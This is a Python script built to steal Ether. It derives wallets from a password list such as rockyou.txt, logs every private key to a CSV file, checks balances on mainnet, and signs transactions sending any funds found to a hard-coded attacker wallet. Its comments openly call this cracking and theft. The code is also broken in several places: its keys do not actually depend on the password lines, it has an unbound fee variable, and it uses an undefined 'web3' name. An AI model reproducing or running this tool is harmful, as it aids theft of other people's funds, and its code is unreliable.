#!/usr/bin/env python3

#############################################
#
# This script does the following:
#	Pulls entropy from a given file (Rockyou.txt or a similar password list works)
#	Creates an Ethereum wallet from this entropy
#	Saves the public and private keys of this wallet into a CSV file for future use
# 	Checks the balance
# 	If we find a wallet with Ether in it, the keys are weak so let's take the balance
#
# Benefits:
#	Multiple permutation attempts per entropy input
# 	Dynamic fee generation (with changeable margin of safety) to ensure your transaction goes through
#	Reporting of all generated keypairs into user-specified file
#
# How to use it:
#	Install 'pip' and any packages this program needs, as listed in the import statements below
#	Update the variables highlighted below
#	Run with 'python ethkeygen.py'
#	???
#	Profit
#
# Project TODOs:
# 	Move user-defined variables to a config file
#	Add more comprehensive permutations
#		main(), tempLine > maxByteLength - do every maxByteLength-length permutation of tempLine
#		main(), maxByteLength else - do every permutation of padding (1L-255R, 2L-254R, 3L-253R, etc)
#	Prompt user to change variable settings upon first running of the program
#	Verbosity setting
# 	Better error handling for web3 calls
#	Check for any ERC tokens, not just Ether specifically
#	Add more wordlists to source file
#	Allow for other-language wordlists
#	Pull in any source files in a directory
# 	Check if this address ever had coins in it and if they were just stolen
#	Generate mnemonic phrases for secondary fuzzing - https://github.com/de-centralized-systems/python-bip39/
#
#############################################

import sys, csv, eth_utils
from web3 import Web3
from eth_account.account import Account
from sys import getsizeof # Why can't we just 'import sys'?

__author__ = "Mark Rudnitsky"
__copyright__ = "(C)2022 Mark Rudnitsky"
__credits__ = ["Mark Rudnitsky"]
__license__ = "GPLv3"
__version__ = "1.1"
__maintainer__ = "Mark Rudnitsky"
__status__ = "Prototype"

##### CHANGE THESE ASAP #####
#
# Entropy source (rockyou.txt or other password list is a good place to start)
# Another useful tool: https://kalilinuxtutorials.com/cook/
keygenFile = "rockyou.txt"
# Filename of database for generated keypairs
dictFileName = "generated-keypairs.csv"
# The wallet we want to transfer found Ether to
controlledWallet = "0x2e2b43E20FCFC44D4cfCB16A723270c7a0Bc914F"
#
### Transaction fee details ###
#
# Max gas we're willing to pay to make our transaction go through; 
# 0 = set the gas price dyamically based on market conditions
maxGasPerTx = 0
# Percent above fee market rate we wnt to be at, 0-100
# Setting this higher gives a higher chance your transaction will be included in the next block
marginOfSafety = 0
# Keep 'gasCost' constant unless you know what you're doing
gasCost = 21000
# To get current values for 'preferredPriorityFee': https://ethgasstation.info, https://etherscan.io/gastracker
preferredPriorityFee = 4
#
### API Details ###
#
# Ethereum mainnet API access through Infura
infuraKey = "UPDATE_TO_YOUR_OWN_API_KEY"
# Infura HTTPS API
connectionUrl = "https://mainnet.infura.io/v3/" + infuraKey 
# Infura Websockets API, uncomment if preferred
#connectionUrl = "wss://mainnet.infura.io/ws/v3/" + infuraKey
#
##### END CHANGE THESE ASAP #####

# Connect to the APIs so we can interact with the Ethereum blockchain
def connect(connectionUrl):
	if (connectionUrl.startswith('wss')): # Websockets
		web3Instance = Web3(Web3.WebsocketProvider(connectionUrl))
	else: # HTTP(S)
		web3Instance = Web3(Web3.HTTPProvider(connectionUrl))
	# Double check our connection works
	if not web3Instance.isConnected():
		sys.exit("[ERROR] Cannot connect to given URL. Please verify you input the correct URL with no typos.")
	return web3Instance

# Use the 'entropy' parameter to create an account
def generateAddress(entropy):
	tempAcct = Account.create(extra_entropy=entropy)
	pubKey = tempAcct.address # Public key/address
	privKey = tempAcct.key # Private key
	# The below line means the private key stored in our can't always be imported into common wallets like Metamask.
	# However, it is actually human readable. Uncomment the line if you'd prefer that.
	#privKey = encode_hex(privKey)
	return pubKey, privKey

# Roll reporting into one function
def reporting(pubKey, privKey, balance):
	#header = ['Ether Wallet Public Key', 'Ether Wallet Private Key', 'ETH Balance in Wei']
	data = [pubKey, privKey, balance]
	with open(dictFileName, 'a+', encoding='UTF8', newline='') as dictionaryFile:
		writer = csv.writer(dictionaryFile)
		writer.writerow(data)

# The actual cracking and theft
def findANonZeroBalance(entropy, web3Instance):
	# Create a wallet
	pubKey, privKey = generateAddress(entropy)
	balance = web3Instance.eth.getBalance(pubKey) # Balance in wei
	#balance = web3.fromWei(balance, "ether") # Balance in Ether
	
	# Save relevant data
	reporting(pubKey, privKey, balance)

	# Jackpot
	if (balance > 0): # 1 in 2^256 chance this condition is true	
		nonce = web3Instance.eth.getTransactionCount(pubKey, 'latest')
		
		# Calculate gas costs (EIP-1559 compliant)
		baseFee = int(maxGasPerTx)
		if not baseFee:
			baseFee = web3Instance.eth.getBlock("pending").baseFeePerGas
		priorityFee = web3Instance.toWei(preferredPriorityFee, 'gwei')
		marginOfSafety = 1 + (marginOfSafety / 100)
		maxFee = web3.toWei((((2 * baseFee) + priorityFee) * marginOfSafety), 'gwei')
		
		# Generate a send-to-us transaction
		tx = {
			'from': pubKey,
			'nonce': nonce,
			'to': controlledWallet,
			'value': balance,
			'gas': gasCost,
			'maxFeePerGas': maxFee,
			'maxPriorityFeePerGas': priorityFee
		}

		signed_tx = web3Instance.eth.account.signTransaction(tx, privKey)
		tx_hash = web3Instance.eth.sendRawTransaction(signed_tx.rawTransaction)
		print("[SUCCESS] " + web3Instance.fromWei(balance, "ether") + " Ether transferred from " + pubKey + " to us in tx " + web3Instance.toHex(tx_hash))

# Main function
def main():
	print("[INFO] Connecting to Ethereum mainnet ... ")
	web3Instance = connect(connectionUrl)
	print("[INFO] Generating keys, this will take a while ...")
	# Open up our source of entropy
	sourceFile = open(keygenFile)

	for lineNum, textLine in enumerate(sourceFile):
		# Get the line from the file and format it for our Ethereum tools
		tempLine = str(textLine).strip()
		tempLine = bytes(tempLine, 'utf-8')

		# Generate address permutations
		tempLineByteLength = getsizeof(tempLine)
		
		# Do basic entropy permutations
		# Only allowed keylengths are defined in BIP39 
		for maxByteLength in [128, 160, 192, 224, 256]:
			# Too long, just use the first or last maxByteLength bytes
			if (tempLineByteLength > maxByteLength):
				# First maxByteLength bytes
				findANonZeroBalance(tempLine[:maxByteLength], web3Instance)

				# Last maxByteLength bytes
				findANonZeroBalance(tempLine[len(tempLine) - maxByteLength:], web3Instance)

			# Edge case - line doesn't exist or isnt working
			elif (tempLineByteLength < 0):
				findANonZeroBalance('', web3Instance)

			# Proper length entropy
			else:
				pad = maxByteLength - tempLineByteLength

				# Pad on the left
				findANonZeroBalance(bytes(pad) + tempLine, web3Instance)
			
				# Pad on the right
				findANonZeroBalance(tempLine + bytes(pad), web3Instance)

				# Pad 50/50 Left/Right split
				findANonZeroBalance(bytes(int(pad / 2)) + tempLine + bytes(int(pad / 2)) + bytes(int(pad % 2)), web3Instance)
				
	print("[INFO] Keygen complete, please check \'" + dictFileName + "\' in this directory for details.")
	sourceFile.close()

# Main function
if __name__=="__main__":
    main()
